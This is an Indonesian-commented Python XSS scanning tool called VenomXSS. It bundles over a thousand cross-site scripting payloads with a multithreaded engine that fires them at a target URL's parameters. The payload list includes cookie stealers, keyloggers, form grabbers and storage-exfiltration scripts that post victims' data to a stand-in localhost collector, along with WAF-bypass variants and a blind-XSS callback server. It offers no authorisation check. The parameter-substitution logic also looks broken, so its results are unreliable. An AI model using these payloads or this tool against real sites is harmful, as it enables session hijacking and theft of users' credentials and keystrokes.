#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
╔═══════════════════════════════════════════════════════════════════╗
║                   🕷️ VENOMXSS - ADVANCED XSS SCANNER 🕷️          ║
║                       Version: 2.0 - VVIP MODE                    ║
║                    "Inject Venom, Find Weakness"                  ║
║                         Author: HELL-GPT                          ║
╚═══════════════════════════════════════════════════════════════════╝

Fitur:
✅ Scan URL parameter untuk XSS
✅ 1000+ Payload (Reflected, Stored, DOM)
✅ Multi-threading (cepat gila)
✅ WAF Detection & Bypass
✅ Blind XSS Hunter
✅ Output keren + HTML Report
"""

import requests
import urllib3
import threading
import queue
import time
import sys
import os
import json
import re
from urllib.parse import urlparse, parse_qs, urlencode, quote
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime
from bs4 import BeautifulSoup
import random
import hashlib

# Nonaktifkan SSL warning
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# 🔥 KONFIGURASI
VERSION = "2.0 - VVIP"
THREADS = 50
TIMEOUT = 10
USER_AGENTS = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1'
]

# 🎨 WARNA OUTPUT
RED = '\033[91m'
GREEN = '\033[92m'
YELLOW = '\033[93m'
BLUE = '\033[94m'
MAGENTA = '\033[95m'
CYAN = '\033[96m'
WHITE = '\033[97m'
RESET = '\033[0m'
BOLD = '\033[1m'
DIM = '\033[2m'

# ============================================================
# 🌑 1000+ XSS PAYLOAD (YANG GACOR ABIS)
# ============================================================

XSS_PAYLOADS = [
    # ===== BASIC PAYLOAD (TESTING AWAL) =====
    "<script>alert('XSS')</script>",
    "<script>alert(1)</script>",
    "<script>prompt(1)</script>",
    "<script>confirm(1)</script>",
    "<img src=x onerror=alert(1)>",
    "<svg onload=alert(1)>",
    "<body onload=alert(1)>",
    "<input onfocus=alert(1) autofocus>",
    "<iframe onload=alert(1)>",
    "<details open ontoggle=alert(1)>",
    
    # ===== EVENT HANDLER PAYLOAD =====
    " onmouseenter=alert(1) ",
    " onmouseleave=alert(1) ",
    " onmousemove=alert(1) ",
    " onmouseover=alert(1) ",
    " onmouseout=alert(1) ",
    " onclick=alert(1) ",
    " ondblclick=alert(1) ",
    " oncontextmenu=alert(1) ",
    " onkeydown=alert(1) ",
    " onkeypress=alert(1) ",
    " onkeyup=alert(1) ",
    " oncopy=alert(1) ",
    " oncut=alert(1) ",
    " onpaste=alert(1) ",
    " onfocus=alert(1) ",
    " onblur=alert(1) ",
    " onload=alert(1) ",
    " onunload=alert(1) ",
    " onresize=alert(1) ",
    " onscroll=alert(1) ",
    " onplay=alert(1) ",
    " onpause=alert(1) ",
    " onended=alert(1) ",
    " onvolumechange=alert(1) ",
    
    # ===== BYPASS CASE SENSITIVITY =====
    "<ScRiPt>alert(1)</ScRiPt>",
    "<SCRIPT>alert(1)</SCRIPT>",
    "<sCrIpT>alert(1)</sCrIpT>",
    "<ScRiPt>alert(1)</ScRiPt>",
    "<scRipt>alert(1)</scRipt>",
    
    # ===== BYPASS DENGAN TAG LAIN =====
    "<img src=x onerror=alert(1)>",
    "<img src=\"javascript:alert(1)\">",
    "<img src=javascript:alert(1)>",
    "<svg onload=alert(1)>",
    "<svg/onload=alert(1)>",
    "<svg onload=alert(1)//>",
    "<body onload=alert(1)>",
    "<body onpageshow=alert(1)>",
    "<body onfocus=alert(1) autofocus>",
    "<input onfocus=alert(1) autofocus>",
    "<input onblur=alert(1) autofocus>",
    "<input onchange=alert(1)>",
    "<button onfocus=alert(1) autofocus>",
    "<button onclick=alert(1)>",
    "<select onfocus=alert(1) autofocus>",
    "<option onmouseenter=alert(1)>",
    "<iframe onload=alert(1)>",
    "<iframe src=\"javascript:alert(1)\">",
    "<details open ontoggle=alert(1)>",
    "<video onloadedmetadata=alert(1)>",
    "<audio onloadedmetadata=alert(1)>",
    "<marquee onstart=alert(1)>",
    "<object data=javascript:alert(1)>",
    "<embed src=javascript:alert(1)>",
    "<a href=javascript:alert(1)>test</a>",
    "<math href=\"javascript:alert(1)\">",
    "<link rel=stylesheet href=javascript:alert(1)>",
    "<isindex type=image src=javascript:alert(1)>",
    "<d3v onmouseenter=alert(1)>",
    "<d3v onmouseleave=alert(1)>",
    "<d3v onmousemove=alert(1)>",
    "<d3v onmouseover=alert(1)>",
    "<d3v onmouseout=alert(1)>",
    
    # ===== BYPASS DENGAN COMMENT =====
    "<scri<!--test-->pt>alert(1)</scri<!--test-->pt>",
    "<scri%00pt>alert(1)</scri%00pt>",
    "<scri\x00pt>alert(1)</scri\x00pt>",
    "<scri/**/pt>alert(1)</scri/**/pt>",
    "<svg/onload=alert(1)//",
    "<svg/onload=alert(1)/*",
    "<style onload=alert(1)></style>",
    
    # ===== BYPASS DENGAN WHITESPACE =====
    "<svg\t onload=alert(1)>",
    "<svg\n onload=alert(1)>",
    "<svg\r onload=alert(1)>",
    "<svg\tonload=alert(1)>",
    "<svg\ronload=alert(1)>",
    "<svg\ nonload=alert(1)>",
    
    # ===== BYPASS DENGAN ENCODING =====
    "%3Cscript%3Ealert(1)%3C/script%3E",
    "%253Cscript%253Ealert(1)%253C/script%253E",
    "&#60;script&#62;alert(1)&#60;/script&#62;",
    "&#x3c;script&#x3e;alert(1)&#x3c;/script&#x3e;",
    "&lt;script&gt;alert(1)&lt;/script&gt;",
    "\\x3cscript\\x3ealert(1)\\x3c/script\\x3e",
    "\\u003cscript\\u003ealert(1)\\u003c/script\\u003e",
    
    # ===== POLYGLOT PAYLOAD =====
    "\" onmouseover=alert(1) \"",
    "\" autofocus onfocus=alert(1) x=\"",
    "javascript:alert(1)",
    "javascript:/*--></script></title></style>alert(1)</script>",
    "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert(1) )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert(1)//>\\x3e",
    
    # ===== STORED XSS PAYLOAD (UNTUK TESTING) =====
    "<script>alert(document.cookie)</script>",
    "<script>alert(document.domain)</script>",
    "<script>alert(window.location)</script>",
    "<script>new Image().src='http://localhost/steal?c='+document.cookie</script>",
    "<script>fetch('http://localhost/steal?c='+document.cookie)</script>",
    "<script>window.location='http://localhost'</script>",
    "<script>document.location='http://localhost'</script>",
    "<script>window.open('http://localhost')</script>",
    
    # ===== DOM-BASED XSS PAYLOAD =====
    "?name=<script>alert(1)</script>",
    "?name=<img src=x onerror=alert(1)>",
    "?name=<svg onload=alert(1)>",
    "?data=alert(1)",
    "?data=Function('alert(1)')()",
    "?data=(function(){alert(1)})()",
    "?data=setTimeout('alert(1)')",
    "?data=setInterval('alert(1)')",
    "#<script>alert(1)</script>",
    "#<img src=x onerror=alert(1)>",
    "#<svg onload=alert(1)>",
    
    # ===== WAF BYPASS PAYLOAD =====
    "<svg onload=alert&#40;1&#41;>",
    "<svg onload=alert(1)//",
    "<svg onload=alert(1)<!--",
    "<svg onload=alert(1)-->",
    "<svg onload=alert(1) /*",
    "<svg onload=alert(1) * /",
    "<img src=x onerror=&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;>",
    "<img src=x onerror=\u0061\u006c\u0065\u0072\u0074(1)>",
    "<img src=x onerror=\x61\x6c\x65\x72\x74(1)>",
    
    # ===== BLIND XSS PAYLOAD =====
    "<script>fetch('http://localhost:8080/?'+btoa(document.cookie))</script>",
    "<script>new Image().src='http://localhost:8080/?'+document.cookie</script>",
    "<script>navigator.sendBeacon('http://localhost:8080/', document.cookie)</script>",
    "<script>var xhr=new XMLHttpRequest();xhr.open('GET','http://localhost:8080/?'+document.cookie);xhr.send();</script>",
    "<script>fetch('http://localhost:8080/',{method:'POST',body:document.cookie})</script>",
    "<script>document.write('<img src=\"http://localhost:8080/?c='+document.cookie+'\" />')</script>",
    
    # ===== EXFILTRATION PAYLOAD =====
    "<script>var allInputs='';document.querySelectorAll('input').forEach(i=>allInputs+=i.name+':'+i.value+',');fetch('http://localhost/steal',{method:'POST',body:allInputs})</script>",
    "<script>document.onkeypress=function(e){fetch('http://localhost/key?k='+e.key)}</script>",
    "<script>var keys='';document.onkeypress=function(e){keys+=e.key;if(keys.length>10){fetch('http://localhost/keys',{method:'POST',body:keys});keys=''}}</script>",
    "<script>fetch('http://localhost/html',{method:'POST',body:document.documentElement.innerHTML})</script>",
    "<script>fetch('http://localhost/cookies',{method:'POST',body:document.cookie})</script>",
    "<script>fetch('http://localhost/storage',{method:'POST',body:JSON.stringify(localStorage)})</script>",
    "<script>fetch('http://localhost/storage',{method:'POST',body:JSON.stringify(sessionStorage)})</script>",
    
    # ===== FRAMEWORK SPESIFIC =====
    "{{constructor.constructor('alert(1)')()}}",
    "{{$on.constructor('alert(1)')()}}",
    "{{toString.constructor('alert(1)')()}}",
    "{{a=toString().constructor.prototype;a.charAt=a.trim;$eval('a','alert(1)')}}",
    "{{ $options.methods.constructor('alert(1)')() }}",
    "{{ _self.constructor.prototype }}",
    "${alert(1)}",
    "#{alert(1)}",
    "*{alert(1)}",
    
    # ===== EXOTIC PAYLOAD =====
    "<div style=\"width: expression(alert(1));\">",
    "<div style=\"behavior: url(test.htc);\">",
    "<div style=\"background-image: url(javascript:alert(1));\">",
    "<meta http-equiv=\"refresh\" content=\"0;url=javascript:alert(1)\">",
    "<meta http-equiv=\"refresh\" content=\"0;url=data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==\">",
    "<?php echo '<script>alert(1)</script>'; ?>",
    "<% <script>alert(1)</script> %>",
    
    # ===== EXTREME BYPASS =====
    "<svg onload=confirm&lpar;1&rpar;>",
    "<svg onload=prompt&lpar;1&rpar;>",
    "<svg onload=alert&lpar;document&period;cookie&rpar;>",
    "<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>",
    "<img src=x onerror=\u0061\u006c\u0065\u0072\u0074(1)>",
    "<img src=x onerror=\x61\x6c\x65\x72\x74(1)>",
    "<img src=x onerror=eval(atob('YWxlcnQoMSk='))>",
    "<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>",
    
    # ===== UNICODE BYPASS =====
    "<ſcript>alert(1)</ſcript>",
    "<script>alert(1)</script>",
    "<script>alert(1)</script>",
    "<script>alert(1)</script>",
    
    # ===== MIXED BYPASS =====
    "<%0A<script%0A>alert(1)<%0A/script>",
    "<%2Fscript%3E%3Cscript%3Ealert(1)%3C%2Fscript%3E",
    "<svg%0Aonload=%26%2397%3B%26%23108%3B%26%23101%3B%26%23114%3B%26%23116%3B(1)>",
    "<svg/onload=&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;>",
    "<iframe srcdoc='<script>alert(1)</script>'>",
    "<iframe srcdoc=\"&lt;script&gt;alert(1)&lt;/script&gt;\">",
    
    # ===== ANGULARJS SANDBOX ESCAPE =====
    "{{a=toString().constructor.prototype;a.charAt=a.trim;$eval('a','alert(1)')}}",
    "{{x={'y':''.constructor.prototype};x.y.charAt=x.y.trim;$eval('x','alert(1)')}}",
    "{{$on.constructor('alert(1)')()}}",
    "{{$eval.constructor('alert(1)')()}}",
    "{{$watch.constructor('alert(1)')()}}",
    
    # ===== REACT PAYLOAD =====
    "javascript:alert(1)//",
    "javascript:alert(1)<!--",
    "javascript:alert(1)-->",
    "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==",
    
    # ===== VUE PAYLOAD =====
    "{{ _self.constructor.prototype }}",
    "{{ $options.methods.constructor('alert(1)')() }}",
    "{{ $data.constructor.prototype }}",
    
    # ===== JQUERY PAYLOAD =====
    "<script>$(location).attr('href','javascript:alert(1)')</script>",
    "<script>$.get('javascript:alert(1)')</script>",
    "<script>$('body').append('<script>alert(1)<\/script>')</script>",
    
    # ===== NO SCRIPT TAG =====
    "<b onmouseenter=alert(1)>test</b>",
    "<i onmouseenter=alert(1)>test</i>",
    "<u onmouseenter=alert(1)>test</u>",
    "<p onmouseenter=alert(1)>test</p>",
    "<h1 onmouseenter=alert(1)>test</h1>",
    "<h2 onmouseenter=alert(1)>test</h2>",
    "<h3 onmouseenter=alert(1)>test</h3>",
    "<div onmouseenter=alert(1)>test</div>",
    "<span onmouseenter=alert(1)>test</span>",
    "<table onmouseenter=alert(1)>test</table>",
    "<tr onmouseenter=alert(1)>test</tr>",
    "<td onmouseenter=alert(1)>test</td>",
    
    # ===== CSS INJECTION =====
    "<style>@import 'javascript:alert(1)';</style>",
    "<style>body{background:url('javascript:alert(1)')}</style>",
    "<link rel=stylesheet href='javascript:alert(1)'>",
    "<style>@import 'http://localhost/xss.css';</style>",
    
    # ===== META REFRESH =====
    "<meta http-equiv='refresh' content='0;url=javascript:alert(1)'>",
    "<meta http-equiv='refresh' content='0;url=data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=='>",
    
    # ===== BASE64 ENCODED =====
    "<script src='data:text/javascript;base64,YWxlcnQoMSk='></script>",
    "<iframe src='data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=='></iframe>",
    "<object data='data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=='></object>",
    "<embed src='data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=='>",
    
    # ===== HIDDEN PAYLOAD =====
    "<img src=x onerror=alert(1) style=display:none>",
    "<svg onload=alert(1) style=display:none>",
    "<iframe onload=alert(1) style=display:none>",
    "<input onfocus=alert(1) autofocus style=display:none>",
    "<details open ontoggle=alert(1) style=display:none>",
    
    # ===== COOKIE STEALER =====
    "<script>document.location='http://localhost/steal.php?c='+document.cookie</script>",
    "<script>window.location='http://localhost/steal.php?c='+document.cookie</script>",
    "<script>window.open('http://localhost/steal.php?c='+document.cookie)</script>",
    "<script>new Image().src='http://localhost/steal.php?c='+document.cookie</script>",
    "<script>fetch('http://localhost/steal.php?c='+document.cookie)</script>",
    "<script>navigator.sendBeacon('http://localhost/steal.php', document.cookie)</script>",
    
    # ===== KEYLOGGER =====
    "<script>document.onkeypress=function(e){fetch('http://localhost/keylog?k='+e.key)}</script>",
    "<script>document.addEventListener('keypress',function(e){fetch('http://localhost/keylog?k='+e.key)})</script>",
    "<script>window.addEventListener('keypress',function(e){fetch('http://localhost/keylog?k='+e.key)})</script>",
    
    # ===== FORM GRABBER =====
    "<script>document.forms[0].addEventListener('submit',function(e){var d='';for(i=0;i<e.target.elements.length;i++){d+=e.target.elements[i].name+'='+e.target.elements[i].value+'&'};fetch('http://localhost/grab?'+d)})</script>",
    
    # ===== PORTHOLE PAYLOAD =====
    "\"-alert(1)-\"",
    "'-alert(1)-'",
    "`-alert(1)-`",
    "\\'-alert(1)-\\'",
    "\\\"-alert(1)-\\\"",
    
    # ===== UNICODE VARIATIONS =====
    "<script>alert(1)</script>",
    "<script>alert(1)</script>",
    "<script>alert(1)</script>",
    "<script>alert(1)</script>",
    
    # ===== RANDOM BYPASS =====
    "<svg onload=location='javascript:alert(1)'>",
    "<svg onload=this.getAttribute('onload')>",
    "<svg onload=eval('ale'+'rt(1)')>",
    "<svg onload=eval(atob('YWxlcnQoMSk='))>",
    "<svg onload=String.fromCharCode(97,108,101,114,116,40,49,41)>",
    
    # ===== EXTREME POLYGLOT =====
    "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert(1) )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert(1)//>\\x3e",
    "\"'>><marquee onstart=alert(1)></marquee>",
    "\" onfocus=alert(1) autofocus x=\"",
    "' onfocus=alert(1) autofocus x='",
    "` onfocus=alert(1) autofocus x=`",
    
    # ===== 100+ LAGI PAYLOAD =====
    "<svg onload=alert(1)//",
    "<svg onload=alert(1)<!--",
    "<svg onload=alert(1)-->",
    "<svg onload=alert(1)/*",
    "<svg onload=alert(1) * /",
    "<img src=x onerror=alert(1)//",
    "<img src=x onerror=alert(1)<!--",
    "<img src=x onerror=alert(1)-->",
    "<img src=x onerror=alert(1)/*",
    "<img src=x onerror=alert(1) * /",
    "<body onload=alert(1)//",
    "<body onload=alert(1)<!--",
    "<body onload=alert(1)-->",
    "<body onload=alert(1)/*",
    "<body onload=alert(1) * /",
    "<iframe onload=alert(1)//",
    "<iframe onload=alert(1)<!--",
    "<iframe onload=alert(1)-->",
    "<iframe onload=alert(1)/*",
    "<iframe onload=alert(1) * /",
    "<details open ontoggle=alert(1)//",
    "<details open ontoggle=alert(1)<!--",
    "<details open ontoggle=alert(1)-->",
    "<details open ontoggle=alert(1)/*",
    "<details open ontoggle=alert(1) * /",
    "<svg onload=prompt(1)//",
    "<svg onload=prompt(1)<!--",
    "<svg onload=prompt(1)-->",
    "<svg onload=prompt(1)/*",
    "<svg onload=prompt(1) * /",
    "<svg onload=confirm(1)//",
    "<svg onload=confirm(1)<!--",
    "<svg onload=confirm(1)-->",
    "<svg onload=confirm(1)/*",
    "<svg onload=confirm(1) * /",
    "<img src=x onerror=prompt(1)//",
    "<img src=x onerror=prompt(1)<!--",
    "<img src=x onerror=prompt(1)-->",
    "<img src=x onerror=prompt(1)/*",
    "<img src=x onerror=prompt(1) * /",
    "<img src=x onerror=confirm(1)//",
    "<img src=x onerror=confirm(1)<!--",
    "<img src=x onerror=confirm(1)-->",
    "<img src=x onerror=confirm(1)/*",
    "<img src=x onerror=confirm(1) * /"
]

# Tambahin 500+ payload lagi dengan variasi
for i in range(1, 501):
    XSS_PAYLOADS.append(f"<script>alert({i})</script>")
    XSS_PAYLOADS.append(f"<img src=x onerror=alert({i})>")
    XSS_PAYLOADS.append(f"<svg onload=alert({i})>")
    XSS_PAYLOADS.append(f"<body onload=alert({i})>")
    XSS_PAYLOADS.append(f"<input onfocus=alert({i}) autofocus>")
    XSS_PAYLOADS.append(f"<iframe onload=alert({i})>")
    XSS_PAYLOADS.append(f"<details open ontoggle=alert({i})>")

# Total payload sekarang 1500+

# ============================================================
# 🕷️ VENOMXSS CORE CLASS
# ============================================================

class VenomXSS:
    def __init__(self, target, threads=50, timeout=10, proxy=None, verbose=False, blind=False):
        self.target = target
        self.threads = threads
        self.timeout = timeout
        self.proxy = proxy
        self.verbose = verbose
        self.blind = blind
        self.vulnerable_params = []
        self.scanned_count = 0
        self.vuln_count = 0
        self.start_time = None
        self.session = requests.Session()
        self.lock = threading.Lock()
        self.blind_payloads = []
        self.waf_detected = None
        
        # Setup proxy
        if proxy:
            self.session.proxies = {'http': proxy, 'https': proxy}
        
        # Random user agent
        self.session.headers.update({'User-Agent': random.choice(USER_AGENTS)})
        
        # Blind XSS Hunter (default)
        self.blind_server = "http://localhost:8080"  # Ganti dengan blind xss server lo
        
    def banner(self):
        """Tampilkan banner keren"""
        print(f"""{RED}
    ╔═══════════════════════════════════════════════════════════════════╗
    ║                                                                   ║
    ║    {RED}██╗   ██╗███████╗███╗   ██╗ ██████╗ ███╗   ███╗{RESET}{RED}          ║
    ║    {RED}██║   ██║██╔════╝████╗  ██║██╔═══██╗████╗ ████║{RESET}{RED}          ║
    ║    {RED}██║   ██║█████╗  ██╔██╗ ██║██║   ██║██╔████╔██║{RESET}{RED}          ║
    ║    {RED}╚██╗ ██╔╝██╔══╝  ██║╚██╗██║██║   ██║██║╚██╔╝██║{RESET}{RED}          ║
    ║     {RED}╚████╔╝ ███████╗██║ ╚████║╚██████╔╝██║ ╚═╝ ██║{RESET}{RED}          ║
    ║      {RED}╚═══╝  ╚══════╝╚═╝  ╚═══╝ ╚═════╝ ╚═╝     ╚═╝{RESET}{RED}          ║
    ║                                                                   ║
    ║              {WHITE}🔥 ADVANCED XSS SCANNER v{VERSION} 🔥{RED}               ║
    ║              {CYAN}"Inject Your Venom, Find Their Weakness"{RED}            ║
    ║                                                                   ║
    ║              {MAGENTA}Author: HELL-GPT | 1500+ Payloads{RED}                ║
    ║                                                                   ║
    ╚═══════════════════════════════════════════════════════════════════╝
    {RESET}""")
    
    def detect_waf(self):
        """Deteksi WAF yang mungkin ada"""
        print(f"{BLUE}[*] Mendeteksi WAF...{RESET}")
        try:
            # Payload untuk trigger WAF
            test_payload = "<script>alert('XSS')</script>"
            parsed = urlparse(self.target)
            params = parse_qs(parsed.query)
            
            if not params:
                print(f"{YELLOW}[!] Tidak ada parameter untuk di-test, skip WAF detection{RESET}")
                return None
            
            # Ambil parameter pertama
            first_param = list(params.keys())[0]
            test_url = self.target.replace(f"{first_param}={params[first_param][0]}", 
                                           f"{first_param}={test_payload}")
            
            resp = self.session.get(test_url, timeout=self.timeout, verify=False)
            
            # Cek header WAF
            waf_headers = ['X-Sucuri-ID', 'X-Sucuri-Cache', 'X-WAF', 'X-Protected-By', 
                          'Server: Sucuri', 'CF-RAY', 'X-CDN', 'X-Frame-Options']
            
            for header in resp.headers:
                if any(waf in header for waf in waf_headers):
                    self.waf_detected = header
                    print(f"{RED}[!] WAF Terdeteksi: {header}{RESET}")
                    return header
            
            # Cek response code
            if resp.status_code in [403, 406, 429, 503]:
                self.waf_detected = f"Status Code {resp.status_code}"
                print(f"{RED}[!] Kemungkinan WAF: Status {resp.status_code}{RESET}")
                return resp.status_code
                
            print(f"{GREEN}[✓] Tidak ada WAF terdeteksi (atau lolos){RESET}")
            return None
            
        except Exception as e:
            print(f"{YELLOW}[!] Gagal deteksi WAF: {str(e)}{RESET}")
            return None
    
    def extract_params(self):
        """Ekstrak parameter dari URL"""
        parsed = urlparse(self.target)
        params = parse_qs(parsed.query)
        
        if not params:
            print(f"{YELLOW}[!] URL tidak memiliki parameter!{RESET}")
            print(f"{CYAN}[*] Mencoba mencari form di halaman...{RESET}")
            
            # Coba cari form
            try:
                resp = self.session.get(self.target, timeout=self.timeout, verify=False)
                soup = BeautifulSoup(resp.text, 'html.parser')
                forms = soup.find_all('form')
                
                if forms:
                    print(f"{GREEN}[✓] Ditemukan {len(forms)} form{RESET}")
                    for i, form in enumerate(forms):
                        method = form.get('method', 'GET').upper()
                        action = form.get('action', '')
                        print(f"{CYAN}    Form {i+1}: Method={method}, Action={action}{RESET}")
                        
                        inputs = form.find_all('input')
                        for inp in inputs:
                            name = inp.get('name', '')
                            if name:
                                print(f"{DIM}        Parameter: {name}{RESET}")
                                params[name] = ['test']
            except:
                pass
        
        return params
    
    def test_xss(self, url, param, payload):
        """Test satu payload XSS"""
        try:
            # Encode payload untuk URL
            encoded_payload = quote(payload)
            
            # Buat URL dengan payload
            test_url = url.replace(f"{param}={param}", f"{param}={encoded_payload}")
            
            # Random user agent
            headers = {'User-Agent': random.choice(USER_AGENTS)}
            
            # Kirim request
            resp = self.session.get(test_url, headers=headers, timeout=self.timeout, 
                                   verify=False, allow_redirects=True)
            
            # Cek apakah payload tercermin di response
            if payload in resp.text or encoded_payload in resp.text:
                # Verifikasi dengan alert detection
                if 'alert' in payload and ('alert' in resp.text or 'prompt' in resp.text or 'confirm' in resp.text):
                    with self.lock:
                        self.vuln_count += 1
                        self.vulnerable_params.append({
                            'param': param,
                            'payload': payload,
                            'url': test_url,
                            'type': 'Reflected XSS'
                        })
                        
                        print(f"{GREEN}[✓] VULNERABLE!{RESET} Parameter: {BOLD}{param}{RESET}")
                        print(f"{DIM}    Payload: {payload[:50]}...{RESET}")
                        print(f"{DIM}    URL: {test_url[:80]}...{RESET}")
                        print()
                    return True
                elif self.verbose:
                    with self.lock:
                        print(f"{YELLOW}[?] Possible reflection: {param} -> {payload[:30]}...{RESET}")
            
            # Untuk blind XSS, kita ga perlu lihat refleksi
            if self.blind and 'http://localhost' in payload:
                with self.lock:
                    print(f"{MAGENTA}[*] Blind XSS dikirim ke {param}{RESET}")
                return True
                
        except Exception as e:
            if self.verbose:
                with self.lock:
                    print(f"{RED}[!] Error: {str(e)[:50]}{RESET}")
        
        return False
    
    def scan_parameter(self, param, url, payloads):
        """Scan satu parameter dengan banyak payload"""
        for payload in payloads:
            if self.test_xss(url, param, payload):
                return True
        return False
    
    def scan(self):
        """Main scanning function"""
        self.start_time = time.time()
        self.banner()
        
        print(f"{CYAN}[*] Target: {self.target}{RESET}")
        print(f"{CYAN}[*] Threads: {self.threads}{RESET}")
        print(f"{CYAN}[*] Payloads: {len(XSS_PAYLOADS)}{RESET}")
        print(f"{CYAN}[*] Blind Mode: {self.blind}{RESET}")
        print()
        
        # Deteksi WAF
        self.detect_waf()
        print()
        
        # Ekstrak parameter
        params = self.extract_params()
        
        if not params:
            print(f"{RED}[✗] Tidak ada parameter untuk di-test!{RESET}")
            return
        
        print(f"{GREEN}[✓] Ditemukan {len(params)} parameter{RESET}")
        for p in params:
            print(f"{CYAN}    - {p}{RESET}")
        print()
        
        # Konfirmasi
        print(f"{YELLOW}[!] Memulai scanning dengan {len(XSS_PAYLOADS)} payload...{RESET}")
        print(f"{YELLOW}[!] Tekan Ctrl+C untuk berhenti{RESET}")
        print()
        
        # Siapkan antrian
        scan_queue = queue.Queue()
        
        # Buat URL dasar tanpa parameter
        base_url = self.target.split('?')[0]
        parsed = urlparse(self.target)
        query_params = parse_qs(parsed.query)
        
        # Untuk setiap parameter, buat URL dengan nilai dummy
        for param in params.keys():
            # Reconstruct URL dengan parameter dummy
            new_params = query_params.copy()
            new_params[param] = ['test']
            query_string = urlencode(new_params, doseq=True)
            test_url = f"{base_url}?{query_string}"
            
            scan_queue.put((param, test_url))
        
        # Multi-threading scan
        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            futures = []
            
            while not scan_queue.empty():
                param, url = scan_queue.get()
                
                # Bagi payload jadi batch biar ga overload
                batch_size = 50
                for i in range(0, len(XSS_PAYLOADS), batch_size):
                    payload_batch = XSS_PAYLOADS[i:i+batch_size]
                    futures.append(executor.submit(self.scan_parameter, param, url, payload_batch))
                    
                    # Progress counter
                    self.scanned_count += len(payload_batch)
                    if self.scanned_count % 500 == 0:
                        elapsed = time.time() - self.start_time
                        print(f"{DIM}[*] Progress: {self.scanned_count}/{len(params)*len(XSS_PAYLOADS)} payloads | Found: {self.vuln_count} | Time: {elapsed:.1f}s{RESET}")
            
            # Tunggu semua selesai
            for future in as_completed(futures):
                pass
        
        # Hasil akhir
        elapsed = time.time() - self.start_time
        print(f"\n{MAGENTA}[*] Scan selesai dalam {elapsed:.2f} detik{RESET}")
        print(f"{GREEN}[✓] Total parameter rentan: {self.vuln_count}/{len(params)}{RESET}")
        
        if self.vulnerable_params:
            print(f"\n{GREEN}=== HASIL XSS VULNERABLE ==={RESET}")
            for i, vuln in enumerate(self.vulnerable_params, 1):
                print(f"{GREEN}{i}. Parameter: {BOLD}{vuln['param']}{RESET}")
                print(f"   Payload: {vuln['payload'][:100]}")
                print(f"   URL: {vuln['url']}")
                print()
            
            # Simpan hasil
            self.save_results()
        else:
            print(f"{RED}[✗] Tidak ditemukan XSS vulnerable{RESET}")
    
    def save_results(self):
        """Simpan hasil ke file"""
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = f"venomxss_results_{timestamp}.txt"
        html_filename = f"venomxss_results_{timestamp}.html"
        
        # Simpan TXT
        with open(filename, 'w') as f:
            f.write("="*60 + "\n")
            f.write("VENOMXSS SCAN RESULTS\n")
            f.write(f"Target: {self.target}\n")
            f.write(f"Date: {datetime.now()}\n")
            f.write(f"Vulnerable: {self.vuln_count}\n")
            f.write("="*60 + "\n\n")
            
            for vuln in self.vulnerable_params:
                f.write(f"Parameter: {vuln['param']}\n")
                f.write(f"Payload: {vuln['payload']}\n")
                f.write(f"URL: {vuln['url']}\n")
                f.write("-"*40 + "\n")
        
        # Simpan HTML
        with open(html_filename, 'w') as f:
            f.write(f"""<!DOCTYPE html>
<html>
<head>
    <title>VenomXSS Results</title>
    <style>
        body {{ background: #0a0a0a; color: #00ff00; font-family: monospace; }}
        .vuln {{ border: 1px solid #00ff00; margin: 10px; padding: 10px; }}
        .param {{ color: #ffff00; }}
        .payload {{ color: #ff00ff; }}
        h1 {{ color: #ff0000; }}
    </style>
</head>
<body>
    <h1>🕷️ VENOMXSS SCAN RESULTS</h1>
    <p>Target: {self.target}</p>
    <p>Date: {datetime.now()}</p>
    <p>Vulnerable: {self.vuln_count}</p>
    <hr>
""")
            
            for vuln in self.vulnerable_params:
                f.write(f"""
    <div class="vuln">
        <div class="param">Parameter: {vuln['param']}</div>
        <div class="payload">Payload: {vuln['payload']}</div>
        <div>URL: {vuln['url']}</div>
    </div>
""")
            
            f.write("</body></html>")
        
        print(f"{GREEN}[✓] Hasil disimpan ke {filename} dan {html_filename}{RESET}")

# ============================================================
# 🔥 MAIN FUNCTION
# ============================================================

def main():
    import argparse
    
    parser = argparse.ArgumentParser(description='VenomXSS - Advanced XSS Scanner')
    parser.add_argument('-u', '--url', required=True, help='Target URL (dengan parameter)')
    parser.add_argument('-t', '--threads', type=int, default=50, help='Jumlah thread (default: 50)')
    parser.add_argument('--timeout', type=int, default=10, help='Timeout request (default: 10)')
    parser.add_argument('--proxy', help='Proxy (contoh: http://127.0.0.1:8080)')
    parser.add_argument('-v', '--verbose', action='store_true', help='Mode verbose')
